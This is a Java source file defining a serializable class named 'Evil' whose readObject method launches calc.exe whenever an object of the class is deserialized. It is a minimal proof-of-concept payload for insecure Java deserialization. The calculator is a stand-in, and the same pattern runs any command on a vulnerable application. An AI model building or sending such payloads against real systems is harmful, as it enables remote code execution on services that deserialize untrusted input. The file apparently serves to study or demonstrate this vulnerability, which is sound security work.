package com.axin;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Evil implements Serializable {
    private static final long serialVersionUID = 4165475584987307708L;
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }
}
